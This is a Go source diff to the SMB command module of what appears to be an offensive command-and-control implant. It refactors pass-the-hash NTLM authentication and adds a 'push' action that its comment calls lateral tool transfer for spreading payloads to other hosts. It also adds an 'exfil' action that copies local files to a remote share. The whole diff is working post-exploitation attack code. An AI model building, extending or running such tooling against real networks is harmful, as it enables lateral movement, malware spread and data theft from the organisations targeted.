@@ -1,7 +1,6 @@
 package commands
 
 import (
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -23,7 +22,7 @@ func (c *SmbCommand) Description() string {
 }
 
 type smbArgs struct {
-	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv
+	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push
 	Host        string `json:"host"`        // target host
 	Share       string `json:"share"`       // share name (e.g., C$, ADMIN$, ShareName)
 	Path        string `json:"path"`        // file/directory path within share
@@ -33,6 +32,7 @@ type smbArgs struct {
 	Domain      string `json:"domain"`      // domain (optional, can be part of username)
 	Content     string `json:"content"`     // file content for upload action
 	Destination string `json:"destination"` // destination path for mv action
+	Source      string `json:"source"`      // local file path for push action
 	Port        int    `json:"port"`        // SMB port (default: 445)
 }
 
@@ -45,15 +45,14 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
 		return errorf("Error parsing parameters: %v", err)
 	}
-	defer structs.ZeroString(&args.Password)
-	defer structs.ZeroString(&args.Hash)
+	defer zeroCredentials(&args.Password, &args.Hash)
 
 	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
 		return errorResult("Error: host, username, and password (or hash) are required")
 	}
 
 	if args.Action == "" {
-		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv")
+		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push")
 	}
 
 	if args.Port <= 0 {
@@ -62,13 +61,7 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Parse domain from username if DOMAIN\user format
 	if args.Domain == "" {
-		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
-			args.Domain = parts[0]
-			args.Username = parts[1]
-		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
-			args.Domain = parts[1]
-			args.Username = parts[0]
-		}
+		args.Domain, args.Username = parseDomainUser(args.Username)
 	}
 
 	switch args.Action {
@@ -104,8 +97,18 @@ func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
 			return errorResult("Error: -share, -path (source), and -destination (target) required for mv action")
 		}
 		return smbRename(args)
+	case "push":
+		if args.Share == "" || args.Path == "" || args.Source == "" {
+			return errorResult("Error: -share, -path (remote destination), and -source (local file) required for push action")
+		}
+		return smbPushFile(args)
+	case "exfil":
+		if args.Share == "" || args.Source == "" {
+			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
+		}
+		return smbExfilFile(args)
 	default:
-		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv", args.Action)
+		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil", args.Action)
 	}
 }
 
@@ -136,59 +139,11 @@ func (sc *smbConn) close() {
 const smbOperationTimeout = 30 * time.Second
 
 func smbConnect(args smbArgs) (*smbConn, error) {
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Host, args.Port), 10*time.Second)
+	session, conn, err := smbDialSession(args.Host, args.Port, args.Username, args.Domain, args.Password, args.Hash, smbOperationTimeout)
 	if err != nil {
-		return nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Host, args.Port, err)
-	}
-
-	initiator := &smb2.NTLMInitiator{
-		User:   args.Username,
-		Domain: args.Domain,
-	}
-
-	// Pass-the-hash: use NTLM hash directly instead of password
-	if args.Hash != "" {
-		hashBytes, err := smbDecodeHash(args.Hash)
-		if err != nil {
-			_ = conn.Close()
-			return nil, fmt.Errorf("invalid NTLM hash: %v", err)
-		}
-		initiator.Hash = hashBytes
-	} else {
-		initiator.Password = args.Password
-	}
-
-	d := &smb2.Dialer{Initiator: initiator}
-
-	// Set a deadline for the SMB session setup (auth exchange)
-	_ = conn.SetDeadline(time.Now().Add(smbOperationTimeout))
-	session, err := d.Dial(conn)
-	if err != nil {
-		_ = conn.Close()
 		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %v", args.Host, args.Domain, args.Username, err)
 	}
-	_ = conn.SetDeadline(time.Time{}) // Clear deadline after auth
-
 	return &smbConn{session: session, conn: conn}, nil
-}
-
-// smbDecodeHash decodes an NTLM hash from various formats:
-// - Pure hex: "8846f7eaee8fb117ad06bdd830b7586c" (16 bytes = NT hash)
-// - LM:NT format: "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
-func smbDecodeHash(hashStr string) ([]byte, error) {
-	hashStr = strings.TrimSpace(hashStr)
-	// Strip LM hash prefix if present (LM:NT format)
-	if parts := strings.SplitN(hashStr, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
-		hashStr = parts[1] // Use NT hash part
-	}
-	hashBytes, err := hex.DecodeString(hashStr)
-	if err != nil {
-		return nil, fmt.Errorf("hash must be hex-encoded: %v", err)
-	}
-	if len(hashBytes) != 16 {
-		return nil, fmt.Errorf("NT hash must be 16 bytes (32 hex chars), got %d bytes", len(hashBytes))
-	}
-	return hashBytes, nil
 }
 
 func smbListShares(args smbArgs) structs.CommandResult {
@@ -231,6 +186,8 @@ func smbListDir(args smbArgs) structs.CommandResult {
 	defer func() { _ = share.Umount() }()
 
 	dirPath := args.Path
+	// Normalize path: strip leading backslashes/slashes (users often try UNC-style \\)
+	dirPath = strings.TrimLeft(dirPath, "\\/")
 	if dirPath == "" {
 		dirPath = "."
 	}
@@ -419,6 +376,56 @@ func smbRename(args smbArgs) structs.CommandResult {
 	}
 
 	return successf("[+] Renamed \\\\%s\\%s\\%s → %s", args.Host, args.Share, args.Path, args.Destination)
+}
+
+// smbPushFile reads a local file and writes it to a remote SMB share.
+// This enables lateral tool transfer (T1570) — pushing payloads, scripts,
+// or tools from the agent's host to other machines on the network.
+func smbPushFile(args smbArgs) structs.CommandResult {
+	// Read local file
+	data, err := os.ReadFile(args.Source)
+	if err != nil {
+		return errorf("Error reading local file %s: %v", args.Source, err)
+	}
+	defer structs.ZeroBytes(data) // clear file content from memory
+
+	sc, err := smbConnect(args)
+	if err != nil {
+		return errorf("Error: %v", err)
+	}
+	defer sc.close()
+
+	// Use longer timeout for large files (60s or 1MB/s estimate)
+	timeout := smbOperationTimeout
+	if estimated := time.Duration(len(data)/1024/1024+1) * time.Second * 2; estimated > timeout {
+		timeout = estimated
+	}
+
+	sc.setDeadline(timeout)
+	share, err := sc.session.Mount(args.Share)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
+	}
+	defer func() { _ = share.Umount() }()
+
+	sc.setDeadline(timeout)
+	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+	}
+	defer func() { _ = f.Close() }()
+
+	sc.setDeadline(timeout)
+	n, err := f.Write(data)
+	sc.clearDeadline()
+	if err != nil {
+		return errorf("Error writing to \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
+	}
+
+	return successf("[+] Pushed %s (%s) → \\\\%s\\%s\\%s",
+		args.Source, formatFileSize(int64(n)), args.Host, args.Share, args.Path)
 }
 
 // formatFileSize is defined in find.go
